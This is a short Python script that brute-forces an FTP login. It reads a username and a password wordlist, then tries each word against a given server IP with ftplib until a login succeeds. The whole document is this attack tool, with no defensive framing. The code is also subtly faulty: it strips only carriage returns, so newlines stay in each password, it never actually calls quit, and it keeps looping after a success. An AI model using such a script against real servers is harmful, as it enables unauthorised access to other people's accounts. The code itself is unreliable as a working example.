import ftplib

server = input("what is the ip of server: ")

username = input("username: ")

plist = input ("file list: ")

try:

	with open(plist, 'r') as pw:

		for word in (pw):
			word=word.strip('\r')

			try:
			     ftp=ftplib.FTP(server)
			     ftp.login(username,word)
			     print (f"succes the password is {word}")
			     ftp.quit
			except:

				print ("still trying")


except:
	print ("your wordlist suck!!!")
